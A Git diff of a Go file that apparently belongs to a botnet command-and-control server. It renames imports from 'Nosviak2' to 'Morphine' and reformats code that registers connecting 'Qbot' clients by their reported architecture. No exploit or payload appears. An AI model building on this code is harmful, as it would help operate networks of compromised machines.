@@ -5,14 +5,14 @@ import (
 	"strings"
 	"time"
 
-	//"Nosviak2/core/sources/layouts/toml"
-	
-	"Nosviak2/core/sources/tools"
-	"Nosviak2/core/sources/layouts/toml"
+	//"Morphine/core/sources/layouts/toml"
+
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/tools"
 )
 
-//handles the new connection properly
-//this will ensure its done without issues
+// handles the new connection properly
+// this will ensure its done without issues
 func HandleConnection(connection net.Conn) error { //err handles
 
 	name := make([]byte, 144)
@@ -26,9 +26,7 @@ func HandleConnection(connection net.Conn) error { //err handles
 	//allows for proper control without issues happening
 	architecture := strings.ReplaceAll(tools.Sanatize(string(name)), toml.ConfigurationToml.Qbot.Splitter, "")
 
-	
 	d := QbotClient{Name: architecture, Queue: make(chan []byte), Conn: connection}
-	
 
 	//adds the client into the map properly
 	//this will ensure its done without errors
